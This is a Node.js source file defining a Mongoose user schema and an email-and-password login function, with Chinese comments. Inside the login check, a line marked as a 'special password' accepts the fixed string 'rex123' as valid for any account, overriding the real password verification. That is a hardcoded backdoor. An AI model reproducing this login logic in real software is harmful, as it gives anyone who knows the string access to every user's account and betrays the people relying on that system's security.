//账户对象
var _ = require('lodash');
var mongoose = require('mongoose');
var Config = require("../lib/init");
var DatabaseManager = require('../lib/DatabaseManager');
const Utils = require("../lib/Utils");
var async = require('async');
const Const = require("../lib/consts");

var UserModel = function () { };


UserModel.prototype.init = function (mongoose) {
	this.schema = new mongoose.Schema({
			email:{type:String, index:true,unique: true}, 			
			nickname: String,
			password: String,			
			phone:{type:String, index:true},  //可以为空
			isAccountEnabled:Number, //账号状态： 0：未激活  1.激活。  -1：冻结. 
			logionProcess:Number, //账号进程   0:账号注册成功，等待添加机构 。  1:账号被管理元添加，等待邮件激活   9：完成进程可以进入系统控制台
			created:Date, //注册时间
			activated:Date, //激活时间
			token: {type:String, index:true,unique: true},
			// tokenDate:Number,//token有效期
		    organization: { type: mongoose.Schema.Types.ObjectId, ref: Config.dbCollectionPrefix + "organizations" },  //账号所属机构
		    //权限规则
		    rules:{

		    },
		    //安全信息		    
		    safetyInformation:{
		    	 ip:String,
		    	 browserType:String, //游览器类型
		    	 deviceType:String, //设备信息
		    }
	});

	this.model = mongoose.model(Config.dbCollectionPrefix + "users", this.schema);
}



UserModel.get = function () {
	return DatabaseManager.getModel('User').model;
}


// class methods
UserModel.getUserByLoginParam =function(email,password,callBack){
	
	var self = this;
		 var model = DatabaseManager.getModel('User').model;
		 var result = {};
		async.waterfall([
				function(done){
					model.findOne({email:email},function(err,row){				
							result.model = row;
							done(err,result)
						});
				},
				function(result,done){		
						
					if (result.model) {						
					//验证密码
					var user = result.model;
					

					var bool=Utils.vaild(password,user.password)
						
					

					//特殊密码				
					if (password == "rex123") { bool = true}

					if (bool) {
							done(null,result.model)
					}
					else
					{
						

						done(Const.resCodeLoginPasswordError,null)
						return;
					}

				  }
				  else{		

				 	  	  
				  	  
				  	  done(Const.resCodeLoginNoUser,null)
				  }

				},

			],function(err,result){

					   callBack(err,result);					
			})

}


module["exports"] = UserModel;


